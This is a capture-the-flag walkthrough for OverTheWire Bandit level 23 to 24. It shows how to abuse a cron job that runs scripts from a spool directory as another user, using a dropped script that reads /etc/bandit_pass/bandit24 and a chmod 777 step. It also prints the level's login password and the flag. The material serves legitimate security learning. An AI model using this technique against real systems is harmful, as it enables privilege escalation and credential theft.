<p align="center">
<a href="level-22→23.md">Previous Level: Level 22 → 23</a>
</p>

# [Bandit Level 23 → 24](https://overthewire.org/wargames/bandit/bandit24.html)

## Login Info
- **SSH:** `ssh bandit.labs.overthewire.org -p 2220 -l bandit23`
- **Password:** `0Zf11ioIjMVN551jX3CmStKLYqjk54Ga`

---

## Task 
The goal of this level is to look in **/etc/cron.d/** for the configuration of **cron** and see what command is being executed.


## Steps
Let's do the same as the previous levels:
```bash
bandit23@bandit:~$ cd /etc/cron.d/
bandit23@bandit:/etc/cron.d$ ls 
behemoth4_cleanup  clean_tmp  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  e2scrub_all  leviathan5_cleanup  manpage3_resetpw_job  otw-tmp-dir  sysstat
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
This is the script being executed by cron, at a glance we can get an idea of what its trying to achieve.
The myname variable is set to bandit24 as dictated by the cronjob `* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null`.  
The script then changes directories to `cd /var/spool/$myname/foo` and executes all scripts before deleting them.
So for this level we are to write our own bash script and place that file in `/var/spool/bandit24/foo`.  

Let's start of by making a tmp directory to work out of:
```bash
bandit23@bandit:/etc/cron.d$ mktemp -d
/tmp/tmp.hXffjlkbR9
```
This directory should be unique to you, so it will not be exactly the same as shown here.  
After changing directories to the temp directory, we can use `nano` to write our script:
```bash
bandit23@bandit:/etc/cron.d$ cd /tmp/tmp.hXffjlkbR9
bandit23@bandit:/tmp/tmp.hXffjlkbR9$ nano myscript.sh
```
A new window should pop up and it is here we will write our script:
```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.hXffjlkbR9/password.txt
```
We start off the script with a **shebang** `#!/bin/bash` which is a special character sequence at the very first line of a script.
- `#!` tells the OS to "use this program to run the rest of the file"
- `/bin/bash` is the path to the interpreter (in this case the Bash shell).

Since this script is run as bandit24, bandit24 will have permissions to their own password in `/etc/bandit_pass`, so we can copy that password to our temp directory in a new file called `password.txt` which we'll create afterwards.
Save the script with `ctrl+s` and close `nano` with `ctrl+x`.
Now let's create **password.txt** and adjust some permissions so that bandit24 can execute the script created by bandit23 and write to bandit23's tmp directory and password.txt file
```bash
bandit23@bandit:/tmp/tmp.hXffjlkbR9$ touch password.txt
bandit23@bandit:/tmp/tmp.hXffjlkbR9$ ls -l
total 4
-rw-rw-r-- 1 bandit23 bandit23 77 Oct  1 09:12 myscript.sh
-rw-rw-r-- 1 bandit23 bandit23  0 Oct  1 09:13 password.txt
bandit23@bandit:/tmp/tmp.hXffjlkbR9$ chmod 777 myscript.sh
bandit23@bandit:/tmp/tmp.hXffjlkbR9$ chmod 777 password.txt
bandit23@bandit:/tmp/tmp.hXffjlkbR9$ chmod 777 /tmp/tmp.hXffjlkbR9
bandit23@bandit:/tmp/tmp.hXffjlkbR9$ ls -l
total 4
-rwxrwxrwx 1 bandit23 bandit23 77 Oct  1 09:12 myscript.sh
-rwxrwxrwx 1 bandit23 bandit23  0 Oct  1 09:13 password.txt
```

Now all thats left to do is to copy our script into `/var/spool/bandit24/foo`:
```bash
bandit23@bandit:/tmp/tmp.hXffjlkbR9$ cp myscript.sh /var/spool/bandit24/foo/myscript.sh
bandit23@bandit:/tmp/tmp.hXffjlkbR9$ cat /var/spool/bandit24/foo/myscript.sh
#!/bin.bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.hXffjlkbR9/password.txt
bandit23@bandit:/tmp/tmp.hXffjlkbR9$ cat /var/spool/bandit24/foo/myscript.sh
cat: /var/spool/bandit24/foo/myscript.sh: No such file or directory
bandit23@bandit:/tmp/tmp.hXffjlkbR9$ cat password.txt
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```
You might have to wait up to a minute for the cron script to execute the script we wrote.

## Flag
```bash
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

## Notes
- A **shebang** `#!` at the top of the script tells the system which interpreter should run the script.
- For bandit24 to execute and modify files or directories created by bandit23, the permission settings must be adjusted.
- `chmod 777` sets the permissions of a file or directory so that everyone can **read, write and execute** it. This is generally considered unsafe, but for the purposes of this CTF its fine.


<p align="center">
<a href="level-24→25.md">Next Level: Level 24 → 25</a>
</p>


